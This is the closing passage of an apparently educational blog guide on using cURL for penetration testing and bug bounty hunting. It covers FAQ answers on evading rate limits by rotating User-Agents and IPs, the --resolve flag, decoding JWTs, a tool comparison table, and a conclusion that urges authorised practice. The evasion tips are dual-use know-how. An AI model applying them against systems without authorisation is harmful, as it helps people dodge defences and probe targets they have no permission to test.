Use `sleep` between requests, randomize intervals, rotate User-Agents and IPs if permitted by the program rules, and reduce concurrency. Respect the target's guidelines — aggressive testing may violate terms.

**Q7: Is it possible to replay a raw HTTP request with cURL?**

Not directly for raw TCP. Use `--http1.1` and manual headers to closely replicate a raw request. For truly raw TCP request replay, use `netcat` or `ncat`. Burp Suite's Repeater is more suitable for this.

**Q8: What is the `--resolve` flag and when should I use it?**

`--resolve target.com:443:10.10.10.5` forces cURL to resolve `target.com` to a specific IP without changing the `Host` header. This is invaluable for testing specific backend servers in a load-balanced pool, or for virtual host discovery by pointing a hostname to a discovered IP.

**Q9: How do I decode a JWT response automatically with cURL?**

```bash
curl -s https://target.com/api/token | \
  python3 -c "import sys,json,base64; t=json.load(sys.stdin)['token'].split('.'); \
  print(base64.b64decode(t[1]+'==').decode())"
```

**Q10: Can I use cURL to test GraphQL?**

Absolutely. cURL handles GraphQL perfectly by sending JSON POST requests to the GraphQL endpoint with `Content-Type: application/json`. See the GraphQL introspection and query examples above.

---

## Comparison Table: cURL vs Browser DevTools vs Burp Suite

| Feature | cURL | Browser DevTools | Burp Suite |
|---------|------|-----------------|------------|
| **Scriptability** | ✅ Excellent (bash/Python) | ❌ None | ⚠️ Macro-based |
| **Request modification** | ✅ Full control | ⚠️ Limited | ✅ Excellent |
| **Cookie management** | ✅ Via files/flags | ✅ Built-in | ✅ Built-in |
| **TLS interception** | ❌ No | ❌ No | ✅ Yes |
| **Automation** | ✅ Native | ❌ No | ⚠️ Burp Intruder |
| **Available without GUI** | ✅ Yes | ❌ No | ❌ No |
| **Host header manipulation** | ✅ Full | ❌ Restricted | ✅ Full |
| **Proxy support** | ✅ Native | ⚠️ System proxy | ✅ Built-in proxy |
| **CORS bypass testing** | ✅ Full | ❌ Browser enforced | ✅ Full |
| **Response timing** | ✅ Built-in `-w` | ⚠️ Network tab | ⚠️ Manual |
| **HTTP/2 support** | ✅ `--http2` | ✅ Automatic | ✅ Supported |
| **Offline/no internet** | ✅ Yes | ❌ Needs browser | ⚠️ Needs Java |
| **Learning curve** | ⚠️ Medium | ✅ Low | ⚠️ Medium-High |
| **Cost** | ✅ Free | ✅ Free | ⚠️ Community/Pro |

---

## Conclusion: Master the Tool, Master the Test

In 2026, the security landscape is more complex than ever — microservices, GraphQL APIs, WebAssembly frontends, and distributed cloud infrastructure have all expanded the attack surface. Yet the fundamentals remain unchanged: HTTP is the universal protocol, and **cURL remains the most precise instrument for probing it.**

The techniques in this guide are not theoretical. They represent the actual workflows of professional pentesters and bug bounty hunters who have earned hundreds of thousands of dollars in payouts by finding vulnerabilities that GUI tools missed — because cURL gives you *exactly* what you ask for, no more, no less.

Start by building muscle memory with the basics: headers, authentication, cookies. Then graduate to CORS testing, Host header injection, and timing analysis. Build recon pipelines that chain cURL with `jq`, `grep`, and Wayback Machine. Route everything interesting through Burp for deeper inspection.

The best security researchers are not tool-dependent. They understand HTTP deeply enough that any HTTP client — including a raw `nc` connection — becomes a valid weapon. cURL is the bridge between that raw understanding and practical efficiency.

---

> **Call to Action:** Practice these techniques in legal environments — build your own Docker lab, use HackTheBox, TryHackMe, or PortSwigger Web Security Academy. Document every finding with `tee` and timestamp your evidence. And remember: the best bug report is the one with a perfect cURL reproduction command.

*Happy hunting. Stay legal. Stay curious.*

---

*Keywords: advanced curl commands, curl for pentesting, bug bounty curl guide, curl API testing, curl security testing, curl reconnaissance, curl for CTF*

---

*© 2026 — Published for educational purposes only. All testing must be conducted on systems you own or have explicit written authorization to test.*
